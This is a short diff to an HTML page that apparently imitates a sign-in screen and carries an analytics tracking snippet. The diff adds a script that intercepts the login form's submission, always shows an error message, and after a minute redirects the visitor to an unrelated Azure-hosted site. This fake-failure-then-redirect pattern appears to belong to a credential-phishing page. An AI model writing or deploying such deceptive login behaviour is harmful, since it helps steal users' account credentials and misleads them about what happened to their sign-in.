@@ -1,7 +1,9 @@
-<!DOCTYPE html>
+
+	
+    <!DOCTYPE html>
 <html lang="en">
   <head>
-	  <script type="text/javascript">
+	    <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
@@ -173,7 +175,17 @@
         <p>Sign-in options</p>
       </div>
     </div>
-  
+    <script>
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          document.getElementById("error-message").style.display = "block";
+          setTimeout(function () {
+            window.location.href = "https://winoct22.z13.web.core.windows.net/";
+          }, 60000);
+        });
+    </script>
   </body>
 </html>
-						
+
